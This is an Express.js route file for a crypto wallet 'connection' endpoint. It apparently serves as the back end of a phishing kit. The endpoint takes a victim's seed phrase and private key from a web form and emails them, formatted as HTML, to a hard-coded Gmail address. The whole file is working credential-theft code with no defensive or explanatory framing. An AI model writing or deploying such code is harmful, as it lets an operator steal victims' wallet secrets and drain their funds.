// server.js or routes/walletRoutes.js
const express = require('express');
const nodemailer = require('nodemailer');
const router = express.Router();

// Configure email service with Gmail
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD,
  },
});

router.post('/api/send-wallet-data', async (req, res) => {
  try {
    const { wallet, seedPhrase, privateKey, timestamp } = req.body;

    // Validate that at least one field is provided
    if (!seedPhrase && !privateKey) {
      return res.status(400).json({ error: 'At least one field required' });
    }

    // Create email content
    const emailContent = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #333; border-bottom: 2px solid #667eea; padding-bottom: 10px;">
          Wallet Connection Data - ${wallet}
        </h2>
        
        <p style="color: #666; font-size: 14px;">
          <strong>Timestamp:</strong> ${new Date(timestamp).toLocaleString()}
        </p>
        
        <hr style="border: none; border-top: 1px solid #e0e0e0; margin: 20px 0;">
        
        ${seedPhrase ? `
          <p style="color: #333; margin: 15px 0 5px 0;"><strong>Seed Phrase:</strong></p>
          <p style="background: #f5f5f5; padding: 10px; border-radius: 5px; word-break: break-all; color: #333; font-family: monospace;">
            ${seedPhrase}
          </p>
          <hr style="border: none; border-top: 1px solid #e0e0e0; margin: 20px 0;">
        ` : ''}
        
        ${privateKey ? `
          <p style="color: #333; margin: 15px 0 5px 0;"><strong>Private Key:</strong></p>
          <p style="background: #f5f5f5; padding: 10px; border-radius: 5px; word-break: break-all; color: #333; font-family: monospace;">
            ${privateKey}
          </p>
          <hr style="border: none; border-top: 1px solid #e0e0e0; margin: 20px 0;">
        ` : ''}
        
        <p style="color: #999; font-size: 12px; font-style: italic;">
          This is an automated email. Please keep this information secure.
        </p>
      </div>
    `;

    // Send email to nosjoachim42@gmail.com
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: 'nosjoachim42@gmail.com',
      subject: `Wallet Connection: ${wallet} - ${new Date().toLocaleString()}`,
      html: emailContent,
    });

    res.json({ success: true, message: 'Data sent successfully' });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ error: 'Failed to send email' });
  }
});

module.exports = router;
